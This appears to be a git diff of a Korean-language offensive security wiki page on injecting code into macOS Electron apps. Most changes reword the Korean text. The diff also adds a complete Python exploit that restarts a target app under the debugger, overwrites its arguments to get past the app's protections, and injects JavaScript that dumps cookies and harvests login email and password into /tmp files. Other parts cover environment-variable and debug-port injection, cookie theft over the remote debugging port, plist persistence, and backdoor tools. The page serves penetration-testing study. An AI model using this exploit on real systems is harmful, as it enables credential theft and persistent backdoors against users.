@@ -13,7 +13,7 @@ Electron이 무엇인지 모른다면 [**여기에서 많은 정보를 찾을 �
 
 - **`RunAsNode`**: 비활성화되면 코드 주입을 위해 환경 변수 **`ELECTRON_RUN_AS_NODE`**의 사용을 방지합니다.
 - **`EnableNodeCliInspectArguments`**: 비활성화되면 `--inspect`, `--inspect-brk`와 같은 매개변수가 무시됩니다. 이를 통해 코드 주입을 피할 수 있습니다.
-- **`EnableEmbeddedAsarIntegrityValidation`**: 활성화되면 로드된 **`asar`** **파일**이 macOS에 의해 **검증**됩니다. 이 파일의 내용을 수정하여 **코드 주입**을 방지합니다.
+- **`EnableEmbeddedAsarIntegrityValidation`**: 활성화되면 로드된 **`asar`** **파일**이 macOS에 의해 **검증**됩니다. 이렇게 하면 이 파일의 내용을 수정하여 **코드 주입**을 방지할 수 있습니다.
 - **`OnlyLoadAppFromAsar`**: 이 옵션이 활성화되면 다음 순서로 로드하는 대신: **`app.asar`**, **`app`** 및 마지막으로 **`default_app.asar`**. 오직 app.asar만 확인하고 사용하므로, **`embeddedAsarIntegrityValidation`** 퓨즈와 결합할 때 **검증되지 않은 코드를 로드하는 것이 불가능**합니다.
 - **`LoadBrowserProcessSpecificV8Snapshot`**: 활성화되면 브라우저 프로세스는 `browser_v8_context_snapshot.bin`이라는 파일을 V8 스냅샷으로 사용합니다.
 
@@ -23,7 +23,7 @@ Electron이 무엇인지 모른다면 [**여기에서 많은 정보를 찾을 �
 
 ### Checking Electron Fuses
 
-응용 프로그램에서 **이 플래그를 확인할 수 있습니다**:
+응용 프로그램에서 **이 플래그를 확인**할 수 있습니다:
 ```bash
 npx @electron/fuses read --app /Applications/Slack.app
 
@@ -46,25 +46,25 @@ In macOS applications this is typically in `application.app/Contents/Frameworks/
 grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
 Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
 ```
-이 파일을 [https://hexed.it/](https://hexed.it/)에 로드하고 이전 문자열을 검색할 수 있습니다. 이 문자열 뒤에는 각 퓨즈가 비활성화되었는지 활성화되었는지를 나타내는 ASCII 숫자 "0" 또는 "1"이 표시됩니다. 헥스 코드를 수정하여(`0x30`은 `0`이고 `0x31`은 `1`) **퓨즈 값을 수정**할 수 있습니다.
+이 파일을 [https://hexed.it/](https://hexed.it/)에서 열고 이전 문자열을 검색할 수 있습니다. 이 문자열 뒤에는 각 퓨즈가 비활성화되었는지 활성화되었는지를 나타내는 ASCII 숫자 "0" 또는 "1"이 표시됩니다. 헥스 코드를 수정하여 **퓨즈 값을 수정**할 수 있습니다 (`0x30`은 `0`이고 `0x31`은 `1`입니다).
 
 <figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>
 
-**`Electron Framework`** 바이너리를 이러한 바이트로 수정하여 애플리케이션 내에서 **덮어쓰려** 하면 앱이 실행되지 않습니다.
+이 바이트가 수정된 상태로 **`Electron Framework` 바이너리**를 애플리케이션 내에서 **덮어쓰려고** 하면 앱이 실행되지 않는다는 점에 유의하세요.
 
 ## RCE 전자 애플리케이션에 코드 추가
 
-Electron 앱이 사용하는 **외부 JS/HTML 파일**이 있을 수 있으므로 공격자는 이러한 파일에 코드를 주입하여 서명이 확인되지 않고 앱의 컨텍스트에서 임의의 코드를 실행할 수 있습니다.
+Electron 앱이 사용하는 **외부 JS/HTML 파일**이 있을 수 있으므로, 공격자는 이러한 파일에 코드를 주입하여 서명이 확인되지 않고 앱의 컨텍스트에서 임의의 코드를 실행할 수 있습니다.
 
 > [!CAUTION]
 > 그러나 현재 2가지 제한 사항이 있습니다:
 >
 > - 앱을 수정하려면 **`kTCCServiceSystemPolicyAppBundles`** 권한이 **필요**하므로 기본적으로 더 이상 가능하지 않습니다.
-> - 컴파일된 **`asap`** 파일은 일반적으로 퓨즈 **`embeddedAsarIntegrityValidation`** `및` **`onlyLoadAppFromAsar`** `가 활성화되어 있습니다.`
+> - 컴파일된 **`asap`** 파일은 일반적으로 **`embeddedAsarIntegrityValidation`** `및` **`onlyLoadAppFromAsar`**가 **활성화**되어 있습니다.
 >
 > 이로 인해 이 공격 경로가 더 복잡해지거나 불가능해집니다.
 
-**`kTCCServiceSystemPolicyAppBundles`** 요구 사항을 우회하는 것이 가능하다는 점에 유의하십시오. 애플리케이션을 다른 디렉토리(예: **`/tmp`**)로 복사하고 폴더 **`app.app/Contents`**의 이름을 **`app.app/NotCon`**으로 바꾸고, **악성** 코드로 **asar** 파일을 **수정**한 후 다시 **`app.app/Contents`**로 이름을 바꾸고 실행할 수 있습니다.
+**`kTCCServiceSystemPolicyAppBundles`** 요구 사항을 우회하는 것이 가능하다는 점에 유의하세요. 애플리케이션을 다른 디렉토리(예: **`/tmp`**)로 복사하고, 폴더 **`app.app/Contents`**의 이름을 **`app.app/NotCon`**으로 변경한 후, **악성** 코드로 **asar** 파일을 **수정**하고 다시 **`app.app/Contents`**로 이름을 바꾼 후 실행할 수 있습니다.
 
 다음 명령어로 asar 파일에서 코드를 추출할 수 있습니다:
 ```bash
@@ -74,7 +74,7 @@ npx asar extract app.asar app-decomp
 ```bash
 npx asar pack app-decomp app-new.asar
 ```
-## RCE with `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>
+## RCE with ELECTRON_RUN_AS_NODE
 
 [**문서**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)에 따르면, 이 환경 변수가 설정되면 프로세스가 일반 Node.js 프로세스로 시작됩니다.
 ```bash
@@ -84,7 +84,7 @@ ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
 ```
 > [!CAUTION]
-> 만약 fuse **`RunAsNode`**가 비활성화되어 있다면 env var **`ELECTRON_RUN_AS_NODE`**는 무시되며, 이 방법은 작동하지 않습니다.
+> 만약 fuse **`RunAsNode`**가 비활성화되어 있으면 env var **`ELECTRON_RUN_AS_NODE`**는 무시되며, 이 방법은 작동하지 않습니다.
 
 ### 앱 Plist에서의 주입
 
@@ -114,7 +114,7 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 ```
 ## RCE with `NODE_OPTIONS`
 
-다른 파일에 페이로드를 저장하고 실행할 수 있습니다:
+페이로드를 다른 파일에 저장하고 실행할 수 있습니다:
 ```bash
 # Content of /tmp/payload.js
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');
@@ -154,12 +154,218 @@ According to [**this**](https://medium.com/@metnew/why-electron-apps-cant-store-
 # Connect to it using chrome://inspect and execute a calculator with:
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
 ```
-> [!CAUTION]
-> 만약 퓨즈 **`EnableNodeCliInspectArguments`**가 비활성화되어 있다면, 앱은 **노드 매개변수**(예: `--inspect`)를 무시하고 실행되며, 환경 변수 **`ELECTRON_RUN_AS_NODE`**가 설정되지 않는 한 무시됩니다. 또한 퓨즈 **`RunAsNode`**가 비활성화되어 있으면 이 변수도 **무시됩니다**.
->
-> 그러나 여전히 **electron 매개변수 `--remote-debugging-port=9229`**를 사용할 수 있지만, 이전 페이로드는 다른 프로세스를 실행하는 데 작동하지 않습니다.
+In [**이 블로그 포스트**](https://hackerone.com/reports/1274695)에서, 이 디버깅은 헤드리스 크롬이 **임의의 파일을 임의의 위치에 다운로드**하도록 악용됩니다.
 
-매개변수 **`--remote-debugging-port=9222`**를 사용하면 Electron 앱에서 **히스토리**(GET 명령어 사용)나 브라우저의 **쿠키**와 같은 정보를 훔칠 수 있습니다(브라우저 내에서 **복호화**되며, 이를 제공하는 **json 엔드포인트**가 있습니다).
+> [!TIP]
+> 앱이 `--inspect`와 같은 환경 변수나 매개변수를 확인하는 고유한 방법이 있다면, `--inspect-brk` 인수를 사용하여 런타임에서 이를 **우회**해 볼 수 있습니다. 이 인수는 앱의 시작 부분에서 **실행을 중지**하고 우회(예: 현재 프로세스의 인수나 환경 변수를 덮어쓰기)를 실행합니다.
+
+다음은 `--inspect-brk` 매개변수로 앱을 모니터링하고 실행함으로써, 그 앱이 가진 사용자 정의 보호를 우회할 수 있었던 익스플로잇입니다(프로세스의 매개변수를 덮어써서 `--inspect-brk`를 제거) 그리고 그 후 JS 페이로드를 주입하여 앱에서 쿠키와 자격 증명을 덤프했습니다:
+```python
+import asyncio
+import websockets
+import json
+import requests
+import os
+import psutil
+from time import sleep
+
+INSPECT_URL = None
+CONT = 0
+CONTEXT_ID = None
+NAME = None
+UNIQUE_ID = None
+
+JS_PAYLOADS = """
+var { webContents } = require('electron');
+var fs = require('fs');
+
+var wc = webContents.getAllWebContents()[0]
+
+
+function writeToFile(filePath, content) {
+const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);
+
+fs.writeFile(filePath, data, (err) => {
+if (err) {
+console.error(`Error writing to file ${filePath}:`, err);
+} else {
+console.log(`File written successfully at ${filePath}`);
+}
+});
+}
+
+function get_cookies() {
+intervalIdCookies = setInterval(() => {
+console.log("Checking cookies...");
+wc.session.cookies.get({})
+.then((cookies) => {
+tokenCookie = cookies.find(cookie => cookie.name === "token");
+if (tokenCookie){
+writeToFile("/tmp/cookies.txt", cookies);
+clearInterval(intervalIdCookies);
+wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
+}
+})
+}, 1000);
+}
+
+function get_creds() {
+in_location = false;
+intervalIdCreds = setInterval(() => {
+if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
+in_location = true;
+console.log("Injecting creds logger...");
+wc.executeJavaScript(`
+(function() {
+email = document.getElementById('login_email_id');
+password = document.getElementById('login_password_id');
+if (password && email) {
+return email.value+":"+password.value;
+}
+})();
+`).then(result => {
+writeToFile("/tmp/victim_credentials.txt", result);
+})
+}
+else if (in_location) {
+wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
+clearInterval(intervalIdCreds);
+}
+}, 10); // Check every 10ms
+setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
+}
+
+get_cookies();
+get_creds();
+console.log("Payloads injected");
+"""
+
+async def get_debugger_url():
+"""
+Fetch the local inspector's WebSocket URL from the JSON endpoint.
+Assumes there's exactly one debug target.
+"""
+global INSPECT_URL
+
+url = "http://127.0.0.1:9229/json"
+response = requests.get(url)
+data = response.json()
+if not data:
+raise RuntimeError("No debug targets found on port 9229.")
+# data[0] should contain an object with "webSocketDebuggerUrl"
+ws_url = data[0].get("webSocketDebuggerUrl")
+if not ws_url:
+raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
+INSPECT_URL = ws_url
+
+
+async def monitor_victim():
+print("Monitoring victim process...")
+found = False
+while not found:
+sleep(1)  # Check every second
+for process in psutil.process_iter(attrs=['pid', 'name']):
+try:
+# Check if the process name contains "victim"
+if process.info['name'] and 'victim' in process.info['name']:
+found = True
+print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
+os.kill(process.info['pid'], 9)  # Force kill the process
+except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+# Handle processes that might have terminated or are inaccessible
+pass
+os.system("open /Applications/victim.app --args --inspect-brk")
+
+async def bypass_protections():
+global CONTEXT_ID, NAME, UNIQUE_ID
+print(f"Connecting to {INSPECT_URL} ...")
+
+async with websockets.connect(INSPECT_URL) as ws:
+data = await send_cmd(ws, "Runtime.enable", get_first=True)
+CONTEXT_ID = data["params"]["context"]["id"]
+NAME = data["params"]["context"]["name"]
+UNIQUE_ID = data["params"]["context"]["uniqueId"]
+
+sleep(1)
+
+await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})
+
+await send_cmd(ws, "Profiler.enable")
+
+await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})
+
+await send_cmd(ws, "Runtime.runIfWaitingForDebugger")
+
+await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})
+
+code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
+await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
+print("Injected code to bypass protections")
+
+
+async def js_payloads():
+global CONT, CONTEXT_ID, NAME, UNIQUE_ID
+
+print(f"Connecting to {INSPECT_URL} ...")
+
+async with websockets.connect(INSPECT_URL) as ws:
+data = await send_cmd(ws, "Runtime.enable", get_first=True)
+CONTEXT_ID = data["params"]["context"]["id"]
+NAME = data["params"]["context"]["name"]
+UNIQUE_ID = data["params"]["context"]["uniqueId"]
+await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
+await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})
+
+
+
+async def main():
+await monitor_victim()
+sleep(3)
+await get_debugger_url()
+await bypass_protections()
+
+sleep(7)
+
+await js_payloads()
+
+
+
+async def send_cmd(ws, method, get_first=False, params={}):
+"""
+Send a command to the inspector and read until we get a response with matching "id".
+"""
+global CONT
+
+CONT += 1
+
+# Send the command
+await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
+sleep(0.4)
+
+# Read messages until we get our command result
+while True:
+response = await ws.recv()
+data = json.loads(response)
+
+# Print for debugging
+print(f"[{method} / {CONT}] ->", data)
+
+if get_first:
+return data
+
+# If this message is a response to our command (by matching "id"), break
+if data.get("id") == CONT:
+return data
+
+# Otherwise it's an event or unrelated message; keep reading
+
+if __name__ == "__main__":
+asyncio.run(main())
+```
+> [!CAUTION]
+> 만약 퓨즈 **`EnableNodeCliInspectArguments`**가 비활성화되어 있다면, 앱은 **노드 매개변수**(예: `--inspect`)를 무시하고 실행되며, 환경 변수 **`ELECTRON_RUN_AS_NODE`**가 설정되지 않는 한 무시됩니다. 또한 퓨즈 **`RunAsNode`**가 비활성화되어 있다면 이 변수도 **무시**됩니다.
+>
+> 그러나 **electron 매개변수 `--remote-debugging-port=9229`**를 사용하여 Electron 앱에서 **히스토리**(GET 명령어로)나 **브라우저의 쿠키**를 훔칠 수 있습니다(브라우저 내에서 **복호화**되며, 이를 제공하는 **json 엔드포인트**가 있습니다).
 
 이 방법에 대해 배우려면 [**여기**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)와 [**여기**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)를 참조하고 자동 도구 [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) 또는 다음과 같은 간단한 스크립트를 사용할 수 있습니다:
 ```python
@@ -169,11 +375,9 @@ ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00",
 ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
 print(ws.recv()
 ```
-In [**this blogpost**](https://hackerone.com/reports/1274695), this debugging is abused to make a headless chrome **download arbitrary files in arbitrary locations**.
-
 ### Injection from the App Plist
 
-이 env 변수를 plist에서 악용하여 지속성을 유지하기 위해 다음 키를 추가할 수 있습니다:
+이 env 변수를 plist에서 악용하여 지속성을 유지할 수 있습니다. 다음 키를 추가하세요:
 ```xml
 <dict>
 <key>ProgramArguments</key>
@@ -194,10 +398,12 @@ In [**this blogpost**](https://hackerone.com/reports/1274695), this debugging is
 
 ## 비 JS 코드 실행
 
-이전 기술을 사용하면 **Electron 애플리케이션의 프로세스 내에서 JS 코드를 실행할 수 있습니다**. 그러나 **자식 프로세스는 부모 애플리케이션과 동일한 샌드박스 프로필에서 실행되며** TCC 권한을 **상속받습니다**.\
-따라서 카메라나 마이크에 접근하기 위해 권한을 악용하고 싶다면, **프로세스에서 다른 바이너리를 실행하면 됩니다**.
+이전 기술을 사용하면 **Electron 애플리케이션의 프로세스 내에서 JS 코드를 실행**할 수 있습니다. 그러나 **자식 프로세스는 부모 애플리케이션과 동일한 샌드박스 프로필에서 실행되며** **TCC 권한을 상속받습니다**.\
+따라서 예를 들어 카메라나 마이크에 접근하기 위해 권한을 악용하고 싶다면, **프로세스에서 다른 바이너리를 실행하면 됩니다**.
 
 ## 자동 주입
+
+- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)
 
 도구 [**electroniz3r**](https://github.com/r3ggi/electroniz3r)는 **취약한 Electron 애플리케이션**을 쉽게 찾아서 그 위에 코드를 주입하는 데 사용할 수 있습니다. 이 도구는 **`--inspect`** 기술을 사용하려고 시도합니다:
 
@@ -237,6 +443,11 @@ You can now kill the app using `kill -9 57739`
 The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
 Shell binding requested. Check `nc 127.0.0.1 12345`
 ```
+- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)
+
+Loki는 Electron 애플리케이션의 JavaScript 파일을 Loki Command & Control JavaScript 파일로 교체하여 백도어를 설계했습니다.
+
+
 ## References
 
 - [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
